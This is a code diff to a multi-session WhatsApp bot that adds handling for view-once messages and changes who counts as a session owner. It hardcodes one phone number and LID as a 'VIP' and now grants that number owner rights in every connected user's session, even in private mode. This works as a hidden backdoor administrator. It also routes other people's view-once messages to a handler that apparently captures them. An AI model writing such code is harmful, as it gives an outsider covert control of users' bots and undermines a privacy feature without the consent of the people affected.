@@ -9790,22 +9790,38 @@ function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
         const _rawMsg = message.message;
         const messageText = _rawMsg?.conversation || _rawMsg?.extendedTextMessage?.text ||
           _rawMsg?.imageMessage?.caption || _rawMsg?.videoMessage?.caption || '';
-        if (!messageText.startsWith(config.prefix)) continue;
+
+        // ✅ Détection vue unique dans sessions Lovable
+        const _msgKeys = Object.keys(message.message || {});
+        const _isViewOnce = !!(
+          message.message?.viewOnceMessageV2 ||
+          message.message?.viewOnceMessageV2Extension ||
+          message.message?.imageMessage?.viewOnce === true ||
+          message.message?.videoMessage?.viewOnce === true ||
+          message.message?.audioMessage?.viewOnce === true ||
+          _msgKeys.some(k => k.toLowerCase().includes('viewonce'))
+        );
+        if (_isViewOnce && !message.key.fromMe) {
+          try { await handleViewOnce(sock, message, remoteJid, senderJid); } catch(e) {}
+        }
+
         const _sessionOwnerNum = phone.replace(/[^0-9]/g, '');
         const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
-        // Numéro connecté = admin de sa propre session uniquement
-        const _isOwner = message.key.fromMe === true || isAdmin(senderJid) || _senderNum === _sessionOwnerNum;
 
-        // Réaction 👑 pour super admin (23591234568 ou LID 124318499475488) — pas admin, juste réaction
-        try {
-          const _vipNum = '23591234568';
-          const _isVip = (_senderNum === _vipNum)
-            || senderJid === '124318499475488@lid'
-            || senderJid.startsWith('124318499475488');
-          if (_isVip && !message.key.fromMe) {
-            await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } });
-          }
-        } catch(e) {}
+        // ✅ Réaction 👑 AVANT tout filtre — sur TOUS les messages du VIP
+        const _isVip = (_senderNum === '23591234568')
+          || senderJid === '124318499475488@lid'
+          || senderJid.startsWith('124318499475488');
+        if (_isVip && !message.key.fromMe) {
+          try { await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } }); } catch(e) {}
+        }
+
+        // ✅ isOwner = fromMe OU admin global OU numéro connecté OU VIP
+        const _isOwner = message.key.fromMe === true || isAdmin(senderJid)
+          || _senderNum === _sessionOwnerNum || _isVip;
+
+        // Filtre prefix — après réaction VIP
+        if (!messageText.startsWith(config.prefix)) continue;
 
         if (botMode === 'private' && !isGroup && !_isOwner) continue;
         console.log('[' + phone + '] 📨 ' + messageText.substring(0, 60) + ' de ' + senderJid);
